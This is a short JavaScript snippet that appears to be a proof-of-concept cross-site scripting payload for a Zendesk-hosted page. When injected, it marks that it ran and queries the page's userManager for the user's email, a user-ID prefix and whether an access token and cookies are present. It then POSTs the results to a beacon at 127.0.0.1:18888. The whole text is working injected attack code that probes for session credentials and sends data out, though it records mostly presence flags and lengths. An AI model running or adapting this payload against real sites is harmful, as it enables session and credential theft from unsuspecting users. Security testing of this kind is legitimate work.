   (async function () {
     window.__XSS_MARKER = "ZENDESK_SCRIPT_EXECUTED_" + Date.now();
     try { document.title = "XSS:" + window.__XSS_MARKER; } catch (e) {}
     const out = { marker: window.__XSS_MARKER, origin: location.origin };
     try {
       const um = window.userManager;
       if (um && um.getUserInfo) {
         const info = await um.getUserInfo();
         out.email_present = !!(info && info.email);
         out.sub_prefix = info && info.sub ? String(info.sub).slice(0, 8) : null;
         out.access_token_present = !!(info && info.tokens && info.tokens.access_token);
         out.cookies_len = (document.cookie || "").length;
       }
     } catch (e) { out.err = String(e).slice(0, 150); }
     try {
       await fetch("http://127.0.0.1:18888/beacon", {
         method: "POST", mode: "no-cors",
         headers: { "Content-Type": "text/plain" },
         body: JSON.stringify(out)
       });
     } catch (e) {}
   })();
